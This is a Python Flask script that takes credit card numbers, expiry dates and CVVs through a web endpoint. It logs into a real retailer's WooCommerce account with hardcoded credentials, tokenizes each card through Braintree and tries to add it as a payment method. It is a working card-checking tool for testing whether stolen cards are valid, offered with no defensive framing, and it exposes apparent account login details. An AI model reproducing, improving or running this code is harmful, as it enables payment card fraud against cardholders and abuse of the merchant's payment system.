from flask import Flask, request, jsonify
import requests
import re
import base64
import json
import uuid

app = Flask(__name__)

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

@app.route('/process', methods=['GET'])
def process():
    cc_details = request.args.get('cc')

    if not cc_details:
        return jsonify({'error': 'Missing credit card details in format cc=number|mm|yy|cvv'}), 400

    try:
        cc_number, exp_month, exp_year, cvv = cc_details.split('|')
        exp_year = exp_year if len(exp_year) == 4 else f"20{exp_year}"  # Fixed expiration year processing
    except ValueError:
        return jsonify({'error': f'{cc_details} - Invalid credit card format. Use number|mm|yy|cvv'}), 400

    user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
    session = requests.Session()

    # **Step 1: Get Nonce**
    headers = {'user-agent': user_agent, 'authority': 'www.bebebrands.com'}
    req = session.get('https://www.bebebrands.com/my-account/', headers=headers)
    nonce_match = re.search(r'id="woocommerce-login-nonce".*?value="(.*?)"', req.text)

    if not nonce_match:
        return jsonify({'error': f'{cc_details} - Failed to retrieve nonce'}), 500

    nonce = nonce_match.group(1)

    # **Step 2: Login Request**
    headers['content-type'] = 'application/x-www-form-urlencoded'
    data = {
        'username': 'Jjuuu818@gmail.com',
        'password': 'God@111983',
        'woocommerce-login-nonce': nonce,
        '_wp_http_referer': '/my-account/',
        'login': 'Log in',
    }
    session.post('https://www.bebebrands.com/my-account/', headers=headers, data=data)

    # **Step 3: Get Client Token**
    req = session.get('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers)
    client_token_nonce = parseX(req.text, '"client_token_nonce":"', '"')
    noncec = parseX(req.text, 'woocommerce-add-payment-method-nonce" value="', '"')

    data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_token_nonce}
    req = session.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', headers=headers, data=data)

    try:
        token_json = req.json()['data']
        token = json.loads(base64.b64decode(token_json))['authorizationFingerprint']
    except (KeyError, json.JSONDecodeError):
        return jsonify({'error': f'{cc_details} - Failed to get authorization token'}), 500

    # **Step 4: Generate Braintree Payment Token**
    headers = {
        'authorization': f'Bearer {token}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': user_agent,
    }
    json_data = {
        'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': str(uuid.uuid4())},
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
        'variables': {
            'input': {'creditCard': {'number': cc_number, 'expirationMonth': exp_month, 'expirationYear': exp_year, 'cvv': cvv}, 'options': {'validate': False}},
        },
        'operationName': 'TokenizeCreditCard',
    }

    req = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

    try:
        tokenized_card = req.json()['data']['tokenizeCreditCard']['token']
    except (KeyError, json.JSONDecodeError):
        return jsonify({'error': f'{cc_details} - Failed to tokenize credit card'}), 500

    # **Step 5: Add Payment Method**
    headers = {'user-agent': user_agent, 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://www.bebebrands.com'}
    data = [
        ('payment_method', 'braintree_credit_card'),
        ('wc-braintree-credit-card-card-type', 'visa'),
        ('wc-braintree-credit-card-3d-secure-enabled', ''),
        ('wc_braintree_credit_card_payment_nonce', tokenized_card),
        ('woocommerce-add-payment-method-nonce', noncec),
        ('_wp_http_referer', '/my-account/add-payment-method/'),
        ('woocommerce_add_payment_method', '1'),
    ]

    req = session.post('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data)

    try:
        error_message = re.search(r'class="message-container.*?>(.*?)</div>', req.text, re.DOTALL).group(1).strip()
    except AttributeError:
        error_message = "Payment method added successfully"

    return jsonify({'result': f'{cc_details} - {error_message}'})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
